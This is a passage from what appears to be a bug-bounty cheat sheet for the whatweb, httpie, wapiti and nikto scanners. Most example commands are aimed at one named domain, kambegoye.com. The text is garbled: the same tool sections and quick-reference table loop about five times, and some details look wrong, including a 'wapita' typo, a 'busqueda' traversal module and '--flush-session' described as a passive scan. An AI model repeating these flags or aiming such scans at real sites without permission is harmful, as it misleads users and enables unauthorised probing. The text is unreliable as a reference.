# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

